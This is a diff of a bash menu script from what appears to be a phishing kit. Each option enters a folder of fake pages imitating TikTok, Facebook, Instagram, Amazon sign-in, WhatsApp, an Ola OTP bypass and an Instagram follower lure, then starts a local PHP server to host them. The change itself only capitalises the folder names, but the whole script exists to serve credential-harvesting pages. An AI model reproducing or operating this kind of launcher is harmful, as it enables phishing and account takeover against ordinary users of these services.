@@ -61,7 +61,7 @@ echo ""
 		 case $option in 
 			 
                          1)cd sites/ 
-                           cd tiktok/
+                           cd Tiktok/
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -81,7 +81,7 @@ echo ""
                 ;;
 	        
 	        2)cd sites/
-                  cd facebook/
+                  cd Facebook/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -102,7 +102,7 @@ echo ""
                 ;;
 
                 3) cd sites/
-                  cd instagram/
+                  cd Instagram/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -147,7 +147,7 @@ echo ""
                 ;;
                  
                 5) cd sites/
-                  cd ola-otpbypass/
+                  cd Ola-otpbypass/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -258,7 +258,7 @@ echo ""
 
 
                9)cd sites/
-                  cd instafollow/
+                  cd Instafollow/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -278,7 +278,7 @@ echo ""
                 ;;
 
                10)cd sites/
-                  cd amazonsign/
+                  cd Amazonsign/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -297,7 +297,7 @@ echo ""
                 ;;
 
                 11)cd sites/
-                  cd whatsapp-phishing/
+                  cd Whatsapp-phishing/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
